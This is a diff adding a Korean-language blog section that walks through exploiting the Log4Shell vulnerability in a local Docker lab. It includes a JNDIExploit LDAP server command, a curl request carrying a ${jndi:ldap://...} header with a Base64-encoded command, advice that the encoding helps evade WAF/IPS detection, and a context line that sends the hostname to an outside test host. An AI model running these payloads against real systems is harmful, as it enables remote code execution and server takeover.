@@ -165,6 +165,54 @@ ${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/(unique_ident
 
 ![log4j_exploit_result2](/assets/images/2022/2022-06-04-23-41-11.png)
 
+### Log4j 취약점을 이용해 공격자가 악의적인 명령어 전송
+
+이번에는 공격자의 LDAP 서버와 통신하는 것을 넘어서 LDPA 서버에서 악의적인 명령어를 전송해
+실제 취약한 Log4j 서버에 행위를 해보는 실습을 해 보겠다.
+
+아까전과 동일한 췽갸한 Log4j 버전을 사용하고 있는 도커 컨테이너를 사용할 것이며
+LDAP 서버는 직접 로컬상에 구축해볼 것이다. 필요한 것은 JNDI Exploit 을 할 수 있도록 구축된 LDAP 서버이다.
+
+[해당 링크](https://github.com/black9/Log4shell_JNDIExploit){: target="_blank"}에서 JDNI Exploit을 지원하는 jar파일을 받을 수 있다.
+*POC 용도로만 사용하며 절대 악용햐는 일은 바란다*
+
+jar 파일을 받고 아래 명령어를 통해 LDAP 서버를 Open하자.
+(Java 8 이상이 설치되어 있어야 한다)
+```
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+```
+
+LDAP 기본포트인 1389와 8888포트가 열린 것을 확인할 수 있다.
+
+![ldap_exploit_kit](/assets//images/2022/2022-06-05-19-09-54.png)
+
+이제 아까의 취약한 Log4j 컨테이너에 아래와 같은 명령어를 날려보자.
+
+```
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}}'
+```
+
+위의 명령어에 대해 잠깐 설명하자면 아까 구축해놓은 LDAP 서버에 취약한 Log4j 서버로 전달할 명령어를 Base64 인코딩 형태로 전달하는 것이다. Base64로 인코딩하는 이유는 WAF나 IPS 같은 패턴기반의 보안장비를 우회하기 위한 목적이라고 볼 수 있다.
+
+**'dG91Y2ggL3RtcC9wd25lZAo'=** 라는 Base64 문자열을 Decode해보면 **'touch /tmp/pwned'** 라는 명령어이다.
+
+위의 명령어가 성공했을 경우 취약한 Log4j 컨테이너의 /tmp 경로에 pwned라는 파일이 생성되어 있을 것이다.
+확인해보자.
+
+![ldap_command_success](/assets/images/2022/2022-06-05-20-00-12.png)
+
+LDAP 서버에서는 정상적으로 명령어를 받았고
+
+```
+docker exec vulnerable-app ls -l /tmp
+```
+
+![vul_log4j_touch_pwned](.assets/images/2022/2022-06-05-20-02-17.png)
+
+취약한 Log4j 컨테이너의 /tmp 폴더에 pwned 라는 파일이 root 권한으로 생성된 것을 확인할 수 있다.
+Reverse Shell의 명령어를 실행하였다면 해당 서버 전체를 탈취한 것이나 마찬가지일 것이다.
+
+
 ## Reference
 - [Log4j 보안 문제와 해킹 과정 재현하기 (feat. CVE-2021-44228)](https://junhyunny.github.io/information/security/log4j-vulnerability-CVE-2021-44228/){: target="_blank"}
 - [아파치 로그4j 취약점에 영향 받는 Log4j Core 공개](https://www.boannews.com/media/view.asp?idx=103419){: target="_blank"}
